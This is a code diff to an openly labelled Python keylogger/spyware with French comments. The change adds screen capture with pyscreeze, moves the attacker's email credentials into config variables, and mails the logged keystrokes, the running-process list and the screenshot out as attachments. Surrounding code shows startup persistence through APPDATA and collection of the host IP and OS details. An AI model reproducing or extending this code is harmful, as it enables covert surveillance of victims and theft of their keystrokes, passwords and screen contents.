@@ -18,6 +18,11 @@ import simplejson
 import re
 import platform
 import shutil
+import pyscreeze
+
+configuser = "L'email pour envoyer"
+configsend = "L'email de réception des données"
+configpassword = "Votre MDP"
 
 def startup():
         strAppPath = APPDATA + "\\" + os.path.basename(strPath)
@@ -28,9 +33,9 @@ def startup():
 
 def emailing():
 # Envois les données à une email.
-    email_user = 'Votre E-mail'
-    email_send = 'Votre E-mail'
-    email_password = 'Votre Mot de Passe'
+    email_user = configuser
+    email_send = configsend
+    email_password = configpassword
     subject = 'Keylogger', myip
 
     msg = MIMEMultipart()
@@ -41,7 +46,7 @@ def emailing():
     body = 'Python Keylogger réponse.'
     msg.attach(MIMEText(body, 'plain'))
 
-    filename='key_log.txt', 'output.txt'
+    filename='key_log.txt', 'output.txt', 's.png'
     attachment =open(filename, 'rb')
 
     part = MIMEBase('application', 'octet-stream')
@@ -70,15 +75,25 @@ def Keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
+    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
+    #def on_press(key):
+    #    logging.info(str(key))
+    #    if key == Key.esc:
+    #        return False
+
 def tasklist():
     tasklist = os.system("tasklist")
     with open("output.txt", "wb") as f:
         f.write(subprocess.check_output(['tasklist']))
         f.close()
 
+def screenshot():
+    screen = pyscreeze.screenshot("s.png")
+
 # Call botnet server
 def Main():
 
+    screenshot()
     tasklist()
     Keylogger()
     startup()
@@ -86,12 +101,6 @@ def Main():
     # Prend l'ip
     hostname = socket.gethostname()
     myip = socket.gethostbyname(hostname)
-
-    # Ici, retirez les 4 # devant les commandes pour faire en sorte que le spyware s'arrête quand on appuie sur Echap.
-    #def on_press(key):
-    #    logging.info(str(key))
-    #    if key == Key.esc:
-    #        return False
 
     osver = platform.platform()
 
